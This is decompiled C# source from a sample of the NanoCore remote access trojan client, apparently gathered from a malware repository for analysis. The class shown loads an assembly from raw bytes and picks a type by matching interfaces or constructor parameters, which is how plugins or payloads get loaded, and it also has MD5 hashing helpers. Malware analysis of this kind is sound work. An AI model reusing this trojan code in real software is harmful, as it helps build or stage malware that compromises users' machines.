// Decompiled with JetBrains decompiler
// Type: Class27
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class Class27
{
  public static string string_0 = "522D4B77-C8AA-4E06-9D54-CF406F661572";

  public static Type smethod_0(byte[] byte_0, Type[] type_0, Type[] type_1)
  {
    foreach (Type type1 in Assembly.Load(byte_0).GetTypes())
    {
      foreach (Type type2 in type1.GetInterfaces())
      {
        if (Array.IndexOf<Type>(type_0, type2) != -1)
          return type1;
      }
      ConstructorInfo[] constructors = type1.GetConstructors();
      if (constructors.Length == 1)
      {
        foreach (ParameterInfo parameter in constructors[0].GetParameters())
        {
          if (Array.IndexOf<Type>(type_1, parameter.ParameterType) != -1)
            return type1;
        }
      }
    }
    return (Type) null;
  }

  public static byte[] smethod_1(string string_1) => new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(string_1));

  public static byte[] smethod_2(byte[] byte_0) => new MD5CryptoServiceProvider().ComputeHash(byte_0);

  public static string smethod_3(Stream stream_0) => BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(stream_0)).Replace("-", string.Empty);

  public static string smethod_4(Stream stream_0, int int_0, long long_0)
  {
    byte[] numArray = new byte[int_0 - 1 + 1];
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    stream_0.Position = 0L;
    int inputCount;
    do
    {
      long num;
      int count = (int) Math.Min((long) numArray.Length, long_0 - num);
      inputCount = stream_0.Read(numArray, 0, count);
      cryptoServiceProvider.TransformBlock(numArray, 0, inputCount, (byte[]) null, 0);
      num += (long) inputCount;
    }
    while (inputCount != 0);
    cryptoServiceProvider.TransformFinalBlock(new byte[0], 0, 0);
    return BitConverter.ToString(cryptoServiceProvider.Hash).Replace("-", string.Empty);
  }
}
